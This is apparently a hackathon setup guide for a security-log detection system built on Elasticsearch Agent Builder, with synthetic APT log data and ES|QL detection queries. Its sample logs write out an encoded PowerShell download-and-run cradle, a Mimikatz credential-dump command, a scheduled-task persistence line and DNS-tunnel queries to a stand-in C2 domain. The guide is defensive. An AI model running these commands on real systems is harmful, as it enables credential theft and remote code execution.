# NIGHTWATCH -- Elasticsearch Console Setup Guide

**Step-by-step instructions for configuring Elasticsearch, Agent Builder, indices, tools, agents, and integrations.**

---

## Table of Contents

1. [Elasticsearch Cloud Setup](#1-elasticsearch-cloud-setup)
2. [Index Creation](#2-index-creation)
3. [Sample Data Ingestion](#3-sample-data-ingestion)
4. [ES|QL Tool Definitions](#4-esql-tool-definitions)
5. [Agent Creation](#5-agent-creation)
6. [MCP Server Configuration](#6-mcp-server-configuration)
7. [A2A Server Configuration](#7-a2a-server-configuration)

---

## 1. Elasticsearch Cloud Setup

### 1.1 Create an Elasticsearch Cloud Deployment

1. Go to [https://cloud.elastic.co](https://cloud.elastic.co) and sign up or log in.
2. Click **"Create deployment"**.
3. Choose a deployment name: `nightwatch-hackathon`.
4. Select region closest to you.
5. Select the latest version (8.x).
6. Choose the **"General Purpose"** hardware profile (sufficient for hackathon).
7. Click **"Create deployment"** and wait for it to spin up.
8. **Save your credentials** (Elasticsearch endpoint URL, Kibana URL, username, password).

### 1.2 Enable Agent Builder

1. Open Kibana (the URL from your deployment).
2. Navigate to **Search** > **Agent Builder** in the left sidebar (under AI-powered features).
3. If prompted, enable Agent Builder for your deployment.
4. If Agent Builder is not visible, ensure your deployment is on version 8.17+ and you have the appropriate license (trial is fine for hackathon).

### 1.3 Configure an LLM Connector

Agent Builder requires an LLM connection. Set one up:

1. In Kibana, go to **Stack Management** > **Connectors**.
2. Click **"Create connector"**.
3. Choose one of:
   - **OpenAI** (recommended for hackathon -- fast, reliable)
   - **Azure OpenAI**
   - **Amazon Bedrock**
   - **Google Vertex AI**
4. Fill in your API key and endpoint.
5. Test the connector and save.
6. Note the connector ID -- you'll need it when creating agents.

### 1.4 Generate API Keys

You need API keys for programmatic access from your Rails backend:

1. In Kibana, go to **Stack Management** > **API Keys**.
2. Click **"Create API key"**.
3. Name it `nightwatch-rails-backend`.
4. Set appropriate role restrictions (or leave as superuser for hackathon).
5. Copy the **Base64-encoded API key** -- this goes in your Rails `.env` file as `KIBANA_API_KEY`.

---

## 2. Index Creation

Create the four Elasticsearch indices that store security log data. Run these commands in the Kibana **Dev Tools Console** (accessible via the left sidebar > Management > Dev Tools).

### 2.1 Authentication Logs Index

```json
PUT nightwatch-auth-logs
{
  "settings": {
    "number_of_shards": 1,
    "number_of_replicas": 1
  },
  "mappings": {
    "properties": {
      "@timestamp": {
        "type": "date"
      },
      "event": {
        "properties": {
          "type": {
            "type": "keyword"
          },
          "outcome": {
            "type": "keyword"
          },
          "action": {
            "type": "keyword"
          },
          "id": {
            "type": "keyword"
          }
        }
      },
      "user": {
        "properties": {
          "name": {
            "type": "keyword"
          },
          "domain": {
            "type": "keyword"
          },
          "id": {
            "type": "keyword"
          }
        }
      },
      "source": {
        "properties": {
          "ip": {
            "type": "ip"
          },
          "geo": {
            "type": "geo_point"
          },
          "port": {
            "type": "integer"
          }
        }
      },
      "destination": {
        "properties": {
          "host": {
            "type": "keyword"
          },
          "ip": {
            "type": "ip"
          },
          "port": {
            "type": "integer"
          }
        }
      },
      "authentication": {
        "properties": {
          "method": {
            "type": "keyword"
          },
          "logon_type": {
            "type": "keyword"
          }
        }
      },
      "host": {
        "properties": {
          "name": {
            "type": "keyword"
          },
          "os": {
            "type": "keyword"
          }
        }
      },
      "message": {
        "type": "text"
      }
    }
  }
}
```

### 2.2 Process Execution Logs Index

```json
PUT nightwatch-process-logs
{
  "settings": {
    "number_of_shards": 1,
    "number_of_replicas": 1
  },
  "mappings": {
    "properties": {
      "@timestamp": {
        "type": "date"
      },
      "host": {
        "properties": {
          "name": {
            "type": "keyword"
          },
          "os": {
            "type": "keyword"
          }
        }
      },
      "process": {
        "properties": {
          "name": {
            "type": "keyword"
          },
          "executable": {
            "type": "keyword"
          },
          "command_line": {
            "type": "text",
            "fields": {
              "keyword": {
                "type": "keyword",
                "ignore_above": 1024
              }
            }
          },
          "pid": {
            "type": "integer"
          },
          "parent": {
            "properties": {
              "name": {
                "type": "keyword"
              },
              "pid": {
                "type": "integer"
              }
            }
          }
        }
      },
      "user": {
        "properties": {
          "name": {
            "type": "keyword"
          },
          "domain": {
            "type": "keyword"
          },
          "privilege_level": {
            "type": "keyword"
          }
        }
      },
      "event": {
        "properties": {
          "type": {
            "type": "keyword"
          },
          "id": {
            "type": "keyword"
          }
        }
      },
      "message": {
        "type": "text"
      }
    }
  }
}
```

### 2.3 Network Logs Index

```json
PUT nightwatch-network-logs
{
  "settings": {
    "number_of_shards": 1,
    "number_of_replicas": 1
  },
  "mappings": {
    "properties": {
      "@timestamp": {
        "type": "date"
      },
      "source": {
        "properties": {
          "ip": {
            "type": "ip"
          },
          "port": {
            "type": "integer"
          },
          "host": {
            "type": "keyword"
          }
        }
      },
      "destination": {
        "properties": {
          "ip": {
            "type": "ip"
          },
          "port": {
            "type": "integer"
          },
          "host": {
            "type": "keyword"
          },
          "domain": {
            "type": "keyword"
          }
        }
      },
      "network": {
        "properties": {
          "protocol": {
            "type": "keyword"
          },
          "bytes": {
            "type": "long"
          },
          "direction": {
            "type": "keyword"
          }
        }
      },
      "dns": {
        "properties": {
          "query": {
            "type": "keyword"
          },
          "query_type": {
            "type": "keyword"
          },
          "response_code": {
            "type": "keyword"
          }
        }
      },
      "host": {
        "properties": {
          "name": {
            "type": "keyword"
          }
        }
      },
      "event": {
        "properties": {
          "type": {
            "type": "keyword"
          }
        }
      },
      "message": {
        "type": "text"
      }
    }
  }
}
```

### 2.4 Threat Intelligence Index

```json
PUT nightwatch-threat-intel
{
  "settings": {
    "number_of_shards": 1,
    "number_of_replicas": 1
  },
  "mappings": {
    "properties": {
      "@timestamp": {
        "type": "date"
      },
      "ioc": {
        "properties": {
          "type": {
            "type": "keyword"
          },
          "value": {
            "type": "keyword"
          }
        }
      },
      "threat": {
        "properties": {
          "name": {
            "type": "keyword"
          },
          "category": {
            "type": "keyword"
          },
          "severity": {
            "type": "keyword"
          },
          "description": {
            "type": "text"
          },
          "mitre_technique": {
            "type": "keyword"
          }
        }
      },
      "source": {
        "type": "keyword"
      },
      "exception_pattern": {
        "properties": {
          "pattern_type": {
            "type": "keyword"
          },
          "description": {
            "type": "text"
          },
          "esql_exclusion": {
            "type": "text"
          },
          "active": {
            "type": "boolean"
          }
        }
      }
    }
  }
}
```

### 2.5 Verify Indices

After creating all four indices, verify they exist:

```
GET _cat/indices/nightwatch-*?v
```

Expected output should list all four indices with `green` or `yellow` health status.

---

## 3. Sample Data Ingestion

### 3.1 APT Attack Scenario Overview

The sample dataset simulates a 7-day APT attack campaign:

| Day | Attack Phase | Activity |
|-----|-------------|----------|
| Day 1 | Initial Compromise | Phishing email delivers macro. `winword.exe` spawns `powershell.exe` on WS-042. |
| Day 2 | Lateral Movement | Attacker uses stolen credentials to RDP into WS-107, SRV-003, SRV-004 from WS-042. |
| Day 3 | Privilege Escalation | Mimikatz-pattern tool executed on WS-107. Domain admin credentials dumped. |
| Day 4 | Lateral Movement | Attacker moves to file server FS-001 and database server DB-001 with domain admin creds. |
| Day 5 | Data Staging | 4.2 GB of files staged in `C:\Windows\Temp` on FS-001. |
| Day 6 | Data Exfiltration | DNS tunneling to external domain. High volume DNS queries from FS-001. |
| Day 7 | Persistence | Scheduled task created on WS-042 and WS-107 for persistence. |

The dataset also includes **normal baseline traffic** (legitimate logins, regular processes, standard network activity) to create realistic noise for the agents to filter through.

### 3.2 Data Generation Script

Create a Python script to generate the dataset. Save this as `scripts/generate_data.py` in your project:

```python
#!/usr/bin/env python3
"""
NIGHTWATCH Sample Data Generator
Generates a 7-day APT attack dataset with normal baseline traffic.
"""

import json
import random
from datetime import datetime, timedelta
from elasticsearch import Elasticsearch, helpers

# --- Configuration ---
ES_URL = "https://your-deployment.es.us-east-1.aws.elastic.cloud:443"
ES_API_KEY = "your-base64-api-key"

es = Elasticsearch(ES_URL, api_key=ES_API_KEY)

# --- Constants ---
NORMAL_USERS = [
    "alice.johnson", "bob.smith", "carol.williams", "dave.brown",
    "eve.davis", "frank.wilson", "grace.moore", "henry.taylor",
    "iris.anderson", "jack.thomas"
]
ATTACKER_USER = "john.doe"  # Compromised IT admin account
NORMAL_HOSTS = [
    "WS-001", "WS-002", "WS-003", "WS-004", "WS-005",
    "WS-010", "WS-011", "WS-012", "WS-015", "WS-020"
]
ATTACK_HOSTS = ["WS-042", "WS-107", "SRV-003", "SRV-004", "FS-001", "DB-001"]
ALL_HOSTS = NORMAL_HOSTS + ATTACK_HOSTS
NORMAL_PROCESSES = [
    ("explorer.exe", "userinit.exe"),
    ("chrome.exe", "explorer.exe"),
    ("outlook.exe", "explorer.exe"),
    ("notepad.exe", "explorer.exe"),
    ("code.exe", "explorer.exe"),
    ("svchost.exe", "services.exe"),
    ("taskhostw.exe", "svchost.exe"),
]

BASE_DATE = datetime(2026, 2, 1, 0, 0, 0)


def generate_normal_auth_logs(day_offset, count=200):
    """Generate normal authentication events for a single day."""
    docs = []
    base = BASE_DATE + timedelta(days=day_offset)
    for _ in range(count):
        user = random.choice(NORMAL_USERS)
        host = random.choice(NORMAL_HOSTS)
        hour = random.choices(range(24), weights=[
            1,1,1,1,1,2,5,10,15,15,15,15,15,15,15,15,10,8,5,3,2,1,1,1
        ])[0]
        ts = base + timedelta(hours=hour, minutes=random.randint(0,59), seconds=random.randint(0,59))
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {
                    "type": "authentication",
                    "outcome": "success",
                    "action": "logon",
                    "id": f"evt-{random.randint(100000,999999)}"
                },
                "user": {"name": user, "domain": "CORP"},
                "source": {
                    "ip": f"10.0.{random.randint(1,10)}.{random.randint(1,254)}",
                    "port": random.randint(49152, 65535)
                },
                "destination": {"host": host, "ip": f"10.0.20.{random.randint(1,254)}"},
                "authentication": {"method": "kerberos", "logon_type": "interactive"},
                "host": {"name": host, "os": "Windows 10"},
                "message": f"Successful logon for {user} on {host}"
            }
        })
    return docs


def generate_attack_auth_logs():
    """Generate the attacker's authentication events across 7 days."""
    docs = []

    # Day 1: Initial compromise - john.doe logs in normally, then suspicious activity
    day1 = BASE_DATE + timedelta(days=0)
    docs.append({
        "_index": "nightwatch-auth-logs",
        "_source": {
            "@timestamp": (day1 + timedelta(hours=9, minutes=14)).isoformat() + "Z",
            "event": {"type": "authentication", "outcome": "success", "action": "logon", "id": "evt-attack-001"},
            "user": {"name": ATTACKER_USER, "domain": "CORP"},
            "source": {"ip": "10.0.5.42", "port": 52341},
            "destination": {"host": "WS-042", "ip": "10.0.20.42"},
            "authentication": {"method": "kerberos", "logon_type": "interactive"},
            "host": {"name": "WS-042", "os": "Windows 10"},
            "message": f"Logon for {ATTACKER_USER} on WS-042 (normal daily login)"
        }
    })

    # Day 2: Lateral movement - RDP to multiple hosts in rapid succession
    day2 = BASE_DATE + timedelta(days=1)
    lateral_targets = ["WS-107", "SRV-003", "SRV-004"]
    for i, target in enumerate(lateral_targets):
        ts = day2 + timedelta(hours=11, minutes=30 + i*15)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {"type": "authentication", "outcome": "success", "action": "logon", "id": f"evt-attack-01{i}"},
                "user": {"name": ATTACKER_USER, "domain": "CORP"},
                "source": {"ip": "10.0.20.42", "port": random.randint(49152, 65535)},
                "destination": {"host": target, "ip": f"10.0.20.{100+i}"},
                "authentication": {"method": "ntlm", "logon_type": "remote_interactive"},
                "host": {"name": target, "os": "Windows Server 2019"},
                "message": f"Remote RDP logon for {ATTACKER_USER} from WS-042 to {target}"
            }
        })
    # Also add 2 failed attempts to other hosts
    for i in range(2):
        ts = day2 + timedelta(hours=11, minutes=20 + i*5)
        target = f"SRV-00{i+5}"
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {"type": "authentication", "outcome": "failure", "action": "logon", "id": f"evt-attack-02{i}"},
                "user": {"name": ATTACKER_USER, "domain": "CORP"},
                "source": {"ip": "10.0.20.42"},
                "destination": {"host": target},
                "authentication": {"method": "ntlm", "logon_type": "remote_interactive"},
                "host": {"name": target, "os": "Windows Server 2019"},
                "message": f"Failed RDP logon attempt for {ATTACKER_USER} to {target}"
            }
        })

    # Day 4: Movement to file server and database with domain admin creds
    day4 = BASE_DATE + timedelta(days=3)
    for i, target in enumerate(["FS-001", "DB-001"]):
        ts = day4 + timedelta(hours=2, minutes=15 + i*10)
        docs.append({
            "_index": "nightwatch-auth-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "event": {"type": "authentication", "outcome": "success", "action": "logon", "id": f"evt-attack-04{i}"},
                "user": {"name": ATTACKER_USER, "domain": "CORP"},
                "source": {"ip": "10.0.20.107", "port": random.randint(49152, 65535)},
                "destination": {"host": target, "ip": f"10.0.30.{i+1}"},
                "authentication": {"method": "ntlm", "logon_type": "remote_interactive"},
                "host": {"name": target, "os": "Windows Server 2019"},
                "message": f"Remote logon for {ATTACKER_USER} from WS-107 to {target} using domain admin credentials"
            }
        })

    return docs


def generate_normal_process_logs(day_offset, count=150):
    """Generate normal process execution events."""
    docs = []
    base = BASE_DATE + timedelta(days=day_offset)
    for _ in range(count):
        proc, parent = random.choice(NORMAL_PROCESSES)
        host = random.choice(ALL_HOSTS)
        hour = random.choices(range(24), weights=[
            1,1,1,1,1,2,5,10,15,15,15,15,15,15,15,15,10,8,5,3,2,1,1,1
        ])[0]
        ts = base + timedelta(hours=hour, minutes=random.randint(0,59))
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "host": {"name": host, "os": "Windows 10"},
                "process": {
                    "name": proc,
                    "executable": f"C:\\Windows\\System32\\{proc}" if "svc" in proc else f"C:\\Program Files\\{proc}",
                    "command_line": f"{proc}",
                    "pid": random.randint(1000, 65535),
                    "parent": {"name": parent, "pid": random.randint(100, 999)}
                },
                "user": {"name": random.choice(NORMAL_USERS), "domain": "CORP", "privilege_level": "standard"},
                "event": {"type": "process_start", "id": f"proc-{random.randint(100000,999999)}"},
                "message": f"Process started: {proc} by {parent}"
            }
        })
    return docs


def generate_attack_process_logs():
    """Generate the attacker's process execution events."""
    docs = []

    # Day 1: Malicious macro -> PowerShell
    day1 = BASE_DATE + timedelta(days=0)
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": (day1 + timedelta(hours=9, minutes=15)).isoformat() + "Z",
            "host": {"name": "WS-042", "os": "Windows 10"},
            "process": {
                "name": "powershell.exe",
                "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                "command_line": "powershell.exe -nop -w hidden -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAALwBzAHQAYQBnAGUAcgAnACkA",
                "pid": 7842,
                "parent": {"name": "winword.exe", "pid": 3456}
            },
            "user": {"name": ATTACKER_USER, "domain": "CORP", "privilege_level": "standard"},
            "event": {"type": "process_start", "id": "proc-attack-001"},
            "message": "SUSPICIOUS: powershell.exe spawned by winword.exe with encoded command"
        }
    })

    # Day 3: Credential dumping (mimikatz-like)
    day3 = BASE_DATE + timedelta(days=2)
    docs.append({
        "_index": "nightwatch-process-logs",
        "_source": {
            "@timestamp": (day3 + timedelta(hours=14, minutes=2)).isoformat() + "Z",
            "host": {"name": "WS-107", "os": "Windows 10"},
            "process": {
                "name": "svchost_update.exe",
                "executable": "C:\\Windows\\Temp\\svchost_update.exe",
                "command_line": "svchost_update.exe privilege::debug sekurlsa::logonpasswords exit",
                "pid": 9102,
                "parent": {"name": "cmd.exe", "pid": 8844}
            },
            "user": {"name": ATTACKER_USER, "domain": "CORP", "privilege_level": "admin"},
            "event": {"type": "process_start", "id": "proc-attack-003"},
            "message": "SUSPICIOUS: Unknown binary with mimikatz-like command line arguments"
        }
    })

    # Day 7: Persistence via scheduled task
    day7 = BASE_DATE + timedelta(days=6)
    for host in ["WS-042", "WS-107"]:
        docs.append({
            "_index": "nightwatch-process-logs",
            "_source": {
                "@timestamp": (day7 + timedelta(hours=3, minutes=30)).isoformat() + "Z",
                "host": {"name": host, "os": "Windows 10"},
                "process": {
                    "name": "schtasks.exe",
                    "executable": "C:\\Windows\\System32\\schtasks.exe",
                    "command_line": f"schtasks /create /tn \"WindowsUpdate\" /tr \"C:\\Windows\\Temp\\update.exe\" /sc daily /st 03:00",
                    "pid": random.randint(5000, 9999),
                    "parent": {"name": "cmd.exe", "pid": random.randint(4000, 4999)}
                },
                "user": {"name": ATTACKER_USER, "domain": "CORP", "privilege_level": "admin"},
                "event": {"type": "process_start", "id": f"proc-attack-persist-{host}"},
                "message": f"Scheduled task created on {host} for persistence"
            }
        })

    return docs


def generate_normal_network_logs(day_offset, count=100):
    """Generate normal network traffic."""
    docs = []
    base = BASE_DATE + timedelta(days=day_offset)
    normal_domains = ["google.com", "microsoft.com", "github.com", "slack.com", "office365.com"]
    for _ in range(count):
        host = random.choice(ALL_HOSTS)
        ts = base + timedelta(hours=random.randint(6,20), minutes=random.randint(0,59))
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "source": {"ip": f"10.0.20.{random.randint(1,254)}", "port": random.randint(49152,65535), "host": host},
                "destination": {
                    "ip": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
                    "port": random.choice([80, 443]),
                    "domain": random.choice(normal_domains)
                },
                "network": {
                    "protocol": "https",
                    "bytes": random.randint(500, 50000),
                    "direction": "outbound"
                },
                "host": {"name": host},
                "event": {"type": "connection"},
                "message": f"Normal HTTPS traffic from {host}"
            }
        })
    return docs


def generate_attack_network_logs():
    """Generate the attacker's network activity."""
    docs = []

    # Day 5: Data staging - large internal transfers
    day5 = BASE_DATE + timedelta(days=4)
    for i in range(20):
        ts = day5 + timedelta(hours=2, minutes=i*3)
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "source": {"ip": "10.0.30.1", "port": random.randint(49152,65535), "host": "FS-001"},
                "destination": {"ip": "10.0.20.42", "port": 445, "host": "WS-042"},
                "network": {
                    "protocol": "smb",
                    "bytes": random.randint(100000000, 500000000),
                    "direction": "internal"
                },
                "host": {"name": "FS-001"},
                "event": {"type": "connection"},
                "message": "Large SMB transfer from FS-001 to WS-042"
            }
        })

    # Day 6: DNS tunneling exfiltration
    day6 = BASE_DATE + timedelta(days=5)
    for i in range(100):
        ts = day6 + timedelta(hours=3, minutes=random.randint(0,120), seconds=random.randint(0,59))
        # DNS tunneling uses long subdomain queries
        tunnel_query = ''.join(random.choices('abcdef0123456789', k=60)) + ".data.evil-c2-server.com"
        docs.append({
            "_index": "nightwatch-network-logs",
            "_source": {
                "@timestamp": ts.isoformat() + "Z",
                "source": {"ip": "10.0.30.1", "port": random.randint(49152,65535), "host": "FS-001"},
                "destination": {"ip": "203.0.113.42", "port": 53, "domain": "evil-c2-server.com"},
                "network": {"protocol": "dns", "bytes": random.randint(200, 500), "direction": "outbound"},
                "dns": {
                    "query": tunnel_query,
                    "query_type": "TXT",
                    "response_code": "NOERROR"
                },
                "host": {"name": "FS-001"},
                "event": {"type": "dns_query"},
                "message": "DNS query with unusually long subdomain"
            }
        })

    return docs


def generate_threat_intel():
    """Generate threat intelligence data and exception patterns."""
    docs = []

    # Known threat indicators
    threat_indicators = [
        {"type": "ip", "value": "203.0.113.42", "name": "APT-29 C2 Server", "severity": "critical", "technique": "T1071.004"},
        {"type": "domain", "value": "evil-c2-server.com", "name": "Known C2 Domain", "severity": "critical", "technique": "T1048.003"},
        {"type": "hash", "value": "a1b2c3d4e5f6...", "name": "Mimikatz Variant", "severity": "high", "technique": "T1003"},
        {"type": "process", "value": "svchost_update.exe", "name": "Renamed Mimikatz", "severity": "high", "technique": "T1036"},
    ]

    for ioc in threat_indicators:
        docs.append({
            "_index": "nightwatch-threat-intel",
            "_source": {
                "@timestamp": datetime.now().isoformat() + "Z",
                "ioc": {"type": ioc["type"], "value": ioc["value"]},
                "threat": {
                    "name": ioc["name"],
                    "category": "apt",
                    "severity": ioc["severity"],
                    "description": f"Known indicator: {ioc['name']}",
                    "mitre_technique": ioc["technique"]
                },
                "source": "NIGHTWATCH-ThreatFeed"
            }
        })

    # Exception patterns (known benign patterns for ADVOCATE)
    exception_patterns = [
        {
            "pattern_type": "it_admin_patching",
            "description": "IT admins perform monthly patch deployment via RDP on the first Tuesday of each month between 22:00-06:00.",
            "esql_exclusion": "user.name IN ('admin.patching', 'svc_sccm') AND authentication.logon_type == 'remote_interactive'",
            "active": True
        },
        {
            "pattern_type": "backup_service",
            "description": "Backup service account performs nightly SMB transfers between FS-001 and BACKUP-SRV.",
            "esql_exclusion": "user.name == 'svc_backup' AND destination.host == 'BACKUP-SRV'",
            "active": True
        }
    ]

    for pattern in exception_patterns:
        docs.append({
            "_index": "nightwatch-threat-intel",
            "_source": {
                "@timestamp": datetime.now().isoformat() + "Z",
                "exception_pattern": pattern,
                "source": "NIGHTWATCH-ExceptionDB"
            }
        })

    return docs


def main():
    print("Generating NIGHTWATCH sample data...")

    all_docs = []

    # Generate 7 days of normal + attack data
    for day in range(7):
        all_docs.extend(generate_normal_auth_logs(day, count=200))
        all_docs.extend(generate_normal_process_logs(day, count=150))
        all_docs.extend(generate_normal_network_logs(day, count=100))

    # Add attack data
    all_docs.extend(generate_attack_auth_logs())
    all_docs.extend(generate_attack_process_logs())
    all_docs.extend(generate_attack_network_logs())

    # Add threat intelligence
    all_docs.extend(generate_threat_intel())

    print(f"Generated {len(all_docs)} documents. Indexing...")

    # Bulk index
    success, errors = helpers.bulk(es, all_docs, stats_only=True)
    print(f"Indexed {success} documents. Errors: {errors}")

    # Verify counts
    for index in ["nightwatch-auth-logs", "nightwatch-process-logs",
                   "nightwatch-network-logs", "nightwatch-threat-intel"]:
        count = es.count(index=index)["count"]
        print(f"  {index}: {count} documents")


if __name__ == "__main__":
    main()
```

### 3.3 Running the Data Generation Script

```bash
# Install dependencies
pip install elasticsearch

# Set environment variables
export ES_URL="https://your-deployment.es.us-east-1.aws.elastic.cloud:443"
export ES_API_KEY="your-base64-api-key"

# Run the script
python scripts/generate_data.py
```

---

## 4. ES|QL Tool Definitions

Create these custom ES|QL tools in Agent Builder. Each tool is a reusable query that agents can invoke.

### How to Create an ES|QL Tool

1. In Kibana, go to **Search** > **Agent Builder**.
2. Navigate to the **Tools** section.
3. Click **"Create tool"** > **"ES|QL tool"**.
4. Fill in the name, description, and ES|QL query.
5. Save the tool. It will be available to assign to agents.

### 4.1 Tool: `brute_force_detector`

**Name:** `brute_force_detector`

**Description:** Detects brute force and credential stuffing attacks by finding IPs with high volumes of failed authentication attempts across multiple user accounts in a short time window.

**ES|QL Query:**
```
FROM nightwatch-auth-logs
| WHERE event.outcome == "failure"
  AND @timestamp > NOW() - 1 hour
| STATS
    failure_count = COUNT(*),
    targeted_users = COUNT_DISTINCT(user.name),
    targeted_hosts = COUNT_DISTINCT(destination.host)
  BY source.ip
| WHERE failure_count > 10 AND targeted_users > 3
| SORT failure_count DESC
| LIMIT 20
```

**Assigned to:** SCANNER

---

### 4.2 Tool: `suspicious_process_chain`

**Name:** `suspicious_process_chain`

**Description:** Detects suspicious parent-child process relationships that indicate malicious activity, such as Office applications spawning command-line interpreters, or unknown binaries with credential dumping tool arguments.

**ES|QL Query:**
```
FROM nightwatch-process-logs
| WHERE @timestamp > NOW() - 24 hours
  AND (
    (process.parent.name IN ("winword.exe", "excel.exe", "powerpnt.exe")
     AND process.name IN ("powershell.exe", "cmd.exe", "wscript.exe", "mshta.exe"))
    OR
    (process.command_line LIKE "*encodedcommand*")
    OR
    (process.command_line LIKE "*sekurlsa*")
    OR
    (process.command_line LIKE "*privilege::debug*")
    OR
    (process.executable LIKE "*\\\\Temp\\\\*" AND process.name NOT IN ("setup.exe", "installer.exe"))
  )
| KEEP @timestamp, host.name, process.name, process.parent.name, process.command_line, user.name
| SORT @timestamp DESC
| LIMIT 50
```

> **Note on backslash escaping:** In ES|QL string literals, `\\` = one backslash. In LIKE patterns, `\\` = one literal backslash. So matching the Windows path separator `\Temp\` requires `\\\\Temp\\\\` in the source (4 backslashes) — two layers of escaping.

**Assigned to:** SCANNER

---

### 4.3 Tool: `lateral_movement_tracker`

**Name:** `lateral_movement_tracker`

**Description:** Identifies lateral movement by finding users who authenticate to an unusually high number of distinct hosts within a short time window, especially via RDP or SMB.

**ES|QL Query:**
```
FROM nightwatch-auth-logs
| WHERE event.outcome == "success"
  AND authentication.logon_type IN ("remote_interactive", "network")
  AND @timestamp > NOW() - 24 hours
| STATS
    host_count = COUNT_DISTINCT(destination.host),
    source_hosts = COUNT_DISTINCT(source.ip),
    logon_count = COUNT(*),
    earliest = MIN(@timestamp),
    latest = MAX(@timestamp)
  BY user.name
| WHERE host_count > 3
| SORT host_count DESC
| LIMIT 20
```

**Assigned to:** TRACER

---

### 4.4 Tool: `privilege_escalation_scanner`

**Name:** `privilege_escalation_scanner`

**Description:** Detects privilege escalation attempts by finding process executions that match known credential dumping tools, token manipulation, UAC bypass, or suspicious service modifications.

**ES|QL Query:**
```
FROM nightwatch-process-logs
| WHERE @timestamp > NOW() - 24 hours
  AND (
    (process.command_line LIKE "*mimikatz*"
     OR process.command_line LIKE "*sekurlsa*"
     OR process.command_line LIKE "*lsadump*"
     OR process.command_line LIKE "*kerberos::*")
    OR
    (process.name == "schtasks.exe" AND process.command_line LIKE "*create*")
    OR
    (process.name == "sc.exe" AND process.command_line LIKE "*create*")
    OR
    (user.privilege_level == "admin"
     AND process.executable LIKE "*\\\\Temp\\\\*")
  )
| KEEP @timestamp, host.name, process.name, process.command_line, process.parent.name, user.name, user.privilege_level
| SORT @timestamp DESC
| LIMIT 30
```

> **Note on backslash escaping:** Same rule as `suspicious_process_chain` — use `\\\\Temp\\\\` (4 backslashes) in the Kibana editor to correctly match the Windows path `\Temp\`.

**Assigned to:** TRACER

---

### 4.5 Tool: `data_exfiltration_detector`

**Name:** `data_exfiltration_detector`

**Description:** Identifies potential data exfiltration by detecting anomalous outbound data transfer volumes, large internal SMB transfers to unusual destinations, and connections to suspicious external IPs.

**ES|QL Query:**
```
FROM nightwatch-network-logs
| WHERE @timestamp > NOW() - 24 hours
  AND (
    (network.direction == "outbound" AND network.bytes > 10000000)
    OR
    (network.protocol == "smb" AND network.bytes > 50000000)
    OR
    (network.direction == "outbound"
     AND destination.port NOT IN (80, 443, 53)
     AND network.bytes > 1000000)
  )
| STATS
    total_bytes = SUM(network.bytes),
    connection_count = COUNT(*),
    unique_destinations = COUNT_DISTINCT(destination.ip)
  BY source.host, network.protocol
| WHERE total_bytes > 100000000
| SORT total_bytes DESC
| LIMIT 20
```

**Assigned to:** SCANNER

---

### 4.6 Tool: `anomalous_dns_detector`

**Name:** `anomalous_dns_detector`

**Description:** Detects DNS-based exfiltration (DNS tunneling) by finding hosts with abnormally high DNS query volumes, unusually long query strings, or queries to suspicious domains.

**ES|QL Query:**
```
FROM nightwatch-network-logs
| WHERE event.type == "dns_query"
  AND @timestamp > NOW() - 24 hours
| STATS
    query_count = COUNT(*),
    unique_domains = COUNT_DISTINCT(destination.domain),
    avg_query_length = AVG(LENGTH(dns.query))
  BY source.host
| WHERE query_count > 50 OR avg_query_length > 40
| SORT query_count DESC
| LIMIT 20
```

**Assigned to:** SCANNER

---

### 4.7 Tool: `threat_intel_lookup`

**Name:** `threat_intel_lookup`

This is an **Index Search tool** (not ES|QL). It searches the threat intelligence index for known indicators of compromise and exception patterns.

**How to create:**
1. In Agent Builder > Tools > Create tool > **Index Search tool**.
2. **Index:** `nightwatch-threat-intel`
3. **Description:** "Search the threat intelligence database for known indicators of compromise (IOCs), threat patterns, and confirmed false positive exception patterns. Use this to validate findings against known threats and known benign patterns."
4. **Fields to return:** `ioc.type`, `ioc.value`, `threat.name`, `threat.severity`, `threat.description`, `threat.mitre_technique`, `exception_pattern.pattern_type`, `exception_pattern.description`, `exception_pattern.esql_exclusion`, `exception_pattern.active`

**Assigned to:** ADVOCATE, TRACER

---

## 5. Agent Creation

### How to Create an Agent

1. In Kibana, go to **Search** > **Agent Builder** > **Agents**.
2. Click **"Create agent"**.
3. Fill in the agent name, select the LLM connector (from Section 1.3), write the system instructions, and assign tools.
4. Test via the built-in chat interface.
5. Note the Agent ID -- you need it for your Rails `.env` file.

### 5.1 SCANNER Agent

**Name:** `SCANNER`

**Display description:** Scans security logs for indicators of initial compromise, brute force attacks, malicious process execution, and data exfiltration attempts.

**Model:** Select your LLM connector (OpenAI GPT-4o recommended)

**System Instructions:**

```
You are SCANNER, a specialized threat detection agent in the NIGHTWATCH security system. Your role is to scan security logs for indicators of initial compromise and data exfiltration.

YOUR RESPONSIBILITIES:
1. Detect initial compromise indicators:
   - Brute force attacks (high volume failed logins)
   - Phishing payload execution (Office apps spawning command-line tools)
   - Stolen credential usage (unusual authentication patterns)
   - Malicious script execution (encoded PowerShell, unusual parent-child processes)

2. Detect data exfiltration indicators:
   - DNS tunneling (anomalous DNS query patterns)
   - Large outbound data transfers
   - Unusual data staging in temp directories

YOUR TOOLS:
- brute_force_detector: Use to find credential attacks
- suspicious_process_chain: Use to find malicious process execution
- data_exfiltration_detector: Use to find large data movements
- anomalous_dns_detector: Use to find DNS-based exfiltration

YOUR OUTPUT FORMAT:
For each finding, provide:
- A clear description of what you found
